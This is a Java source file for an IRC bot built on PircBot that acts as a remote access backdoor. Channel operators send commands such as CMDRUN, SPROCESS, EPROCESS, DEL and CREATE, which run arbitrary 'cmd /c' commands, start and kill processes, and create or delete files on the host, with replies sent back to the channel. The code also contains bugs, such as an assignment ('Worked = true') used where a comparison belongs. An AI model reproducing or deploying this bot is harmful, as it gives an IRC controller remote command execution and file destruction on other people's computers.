import java.io.File;
import java.io.IOException;

import javax.swing.JOptionPane;

import org.jibble.pircbot.PircBot;
import org.jibble.pircbot.User;

public class CBotS1 extends PircBot {
	File PrevDir = new File("C:\\");
	File dir = new File("C:\\");
	public CBotS1(String BotNick) {
		this.setName(BotNick);
		System.out.println("New bot created with nick " + BotNick);
}
	
	protected void onMessage(String channel,
            String sender,
            String login,
            String hostname,
            String message) {
		User[] userList = getUsers(channel);
		int isAuthed = 0;
		for (int i = 0; i < userList.length; i++) {
			if (userList[i].equals(sender) && userList[i].isOp()) {
					isAuthed = 1;
			}
		}
		if (message.contains("(") && message.substring(message.length() - 2).equalsIgnoreCase(");") && isAuthed == 1) {
			if (message.startsWith("CDL")) {
				String[] list = dir.list();
				sendMessage(channel, "Listing files in " + dir + " (" + list.length + " files/dirs)");
				for (int i = 0; i < list.length; i++) {
					sendMessage(channel, list[i]);
				}
			}
			if (message.startsWith("CD")) {
				String command = message.substring(3, message.length() - 2);
				if (!command.equals("")) {
					dir = new File(message.substring(3, message.length() - 2));
					sendMessage(channel, "DIR changed to " + dir);
				}
				else if (command.equals("")) {
					dir = PrevDir;
					sendMessage(channel, "Gone back one dir to " + dir);
				}
			}
			if (message.startsWith("CDA")) {
				String command = message.substring(4, message.length() - 2);
				File testDir = new File(command);
				if (testDir.exists() == true && !command.equals("")) {
					PrevDir = dir;
					dir = new File(dir + message.substring(4, message.length() - 2));
					sendMessage(channel, "DIR changed using append tool to " + dir);
				}
				else if (testDir.exists() == false && !command.equals("")) {
					PrevDir = dir;
						dir = new File(dir + "\\" + message.substring(4, message.length() - 2));
						sendMessage(channel, "DIR changed using append tool to " + dir);
				}
				else if (command.equals("")) {
					dir = PrevDir;
					sendMessage(channel, "Gone back one dir to " + dir);
				}
						else { 
							sendMessage(channel, "Folder does not exist. Please use 'CDL()' to see current files in working DIR");
						}
			}
			
			if (message.startsWith("DEL")) {
				File f = new File(dir + message.substring(4, message.length() - 2));
				boolean Worked = f.delete();
				if (Worked = true) {
					sendMessage(channel, "Deletion of " + f + "seems to have worked. Use CDL(); to check for file existance.");
				}
				if (Worked = false) {
					sendMessage(channel, "Deletion of " + f + " failed. Possible reasons: if it was a dir, it wasn't empty; if it was write protected; if it did not exist");
				}
			}
			if (message.startsWith("CREATE")) {
				File f = new File(dir + message.substring(7, message.length() - 2));
				if (!f.exists()) {
					try {
						f.createNewFile();
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
					sendMessage(channel, "Created a new file called " + message.substring(7, message.length() - 2));
				}
				else if (f.exists()) {
					sendMessage(channel, "File already exists.");
				}
			}
			
			if (message.startsWith("WCD")) {
				sendMessage(channel, "The current working directory is: " + dir);
			}

			if (message.startsWith("CD..")) {
				
			}	
			if (message.startsWith("SPROCESS")) {
				try {
					Process process = Runtime.getRuntime ().exec (dir + "\\" + message.substring(9, message.length() - 2));
				} catch (IOException e) {
					sendMessage(channel, "The execution of the process failed. General reasons: File does not exist; file does not have read atribute.");
				}
			}
			if (message.startsWith("EPROCESS")) {
				try {
					Runtime.getRuntime().exec("taskkill /IM " + message.substring(9, message.length() - 2));
				} catch (IOException e) {
					sendMessage(channel, "Program ending failed. General reasons: Program is not running.");
				}
			}
			if (message.startsWith("CMDRUN")) {
				Runtime rt = Runtime.getRuntime();
				try {
					Process p = rt.exec("cmd /c " + message.substring(7, message.length() - 2));
					sendMessage(channel, "Ran command " + message.substring(7, message.length() - 2));
				} catch (IOException e) {
					sendMessage(channel, "Command execution failed. General reasons: This message should not show up in any way.");
				}
			}
			if (message.startsWith("MAKEMSGBOX")) {
				JOptionPane.showMessageDialog(null, message.substring(11, message.length() - 2));
			}
			}

	}
	}
